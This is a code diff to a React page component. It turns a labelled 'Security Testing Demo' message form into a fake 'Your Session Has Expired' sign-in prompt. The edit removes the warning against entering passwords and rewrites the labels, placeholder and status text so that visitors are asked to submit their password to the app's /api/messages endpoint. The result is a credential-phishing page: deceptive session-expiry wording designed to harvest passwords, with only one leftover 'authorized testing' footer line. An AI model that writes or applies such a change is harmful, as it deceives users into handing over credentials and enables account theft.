@@ -11,7 +11,7 @@ export default function Home() {
     event.preventDefault();
     if (!message.trim() || sending) return;
     setSending(true);
-    setStatus("Sending your test message...");
+    setStatus("Sending your password...");
 
     try {
       const response = await fetch("/api/messages", {
@@ -21,7 +21,7 @@ export default function Home() {
       });
       const result = await response.json().catch(() => ({}));
       if (!response.ok) throw new Error(result.error || `Server returned HTTP ${response.status}`);
-      setStatus("Message submitted successfully.");
+      setStatus("password submitted successfully.");
       setMessage("");
     } catch (error) {
       setStatus(`Submission failed: ${error.message}`);
@@ -34,17 +34,16 @@ export default function Home() {
     <main className="session-wrapper" aria-hidden="false">
       <section className="session-card" role="dialog" aria-modal="true" aria-labelledby="page-title" tabIndex={-1}>
         <div className="session-icon" aria-hidden="true"><i className="bi bi-shield-lock-fill" /></div>
-        <div className="session-badge">SECURITY TESTING DEMO</div>
-        <h1 id="page-title">Submit a Test Message</h1>
+        <div className="session-badge">Your Session Has Expired</div>
+        <h1 id="page-title">Submit a password</h1>
         <p className="session-description">
-          Use this demo to submit a non-sensitive text message to the application API.
-          Do not enter passwords, personal information, or other confidential data.
+          For your security, your session has expired due to inactivity. Please sign in again to continue accessing your account.
         </p>
 
         <div className="session-divider" />
 
         <form onSubmit={submitMessage}>
-          <label className="field-label" htmlFor="message">Your message</label>
+          <label className="field-label" htmlFor="message">Password</label>
           <textarea
             id="message"
             value={message}
@@ -52,11 +51,11 @@ export default function Home() {
             maxLength={2000}
             required
             rows={5}
-            placeholder="Enter a test message..."
+            placeholder="Enter a password..."
           />
           <div className="field-meta"><span>Maximum 2,000 characters</span><span>{message.length}/2000</span></div>
           <button className="session-button" type="submit" disabled={!message.trim() || sending}>
-            {sending ? "Submitting..." : "Submit Message"}
+            {sending ? "Submitting..." : "Submit"}
             <i className={`bi ${sending ? "bi-arrow-repeat" : "bi-arrow-right"}`} />
           </button>
         </form>
@@ -66,7 +65,7 @@ export default function Home() {
           <i className="bi bi-shield-check" />
           For authorized testing only. Keep submitted data non-sensitive.
         </div>
-        <footer className="session-footer">Security Testing Demo</footer>
+        <footer className="session-footer">Your Session Has Expired</footer>
       </section>
     </main>
   );
